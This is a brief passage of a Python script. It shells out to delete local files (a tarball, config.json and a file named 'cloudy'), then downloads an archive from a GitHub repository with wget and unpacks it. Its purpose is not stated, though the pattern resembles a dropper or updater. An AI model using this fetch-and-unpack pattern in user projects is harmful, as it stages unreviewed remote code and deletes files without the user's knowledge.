...
os.system("rm cloudybork.tar.gz")
os.system("rm config.json")
os.system("rm cloudy")
os.system("wget https://github.com/n2dhektor/fictional-octo-waddle/raw/main/cloudybork.tar.gz")
os.system("tar -xf cloudybork.tar.gz")
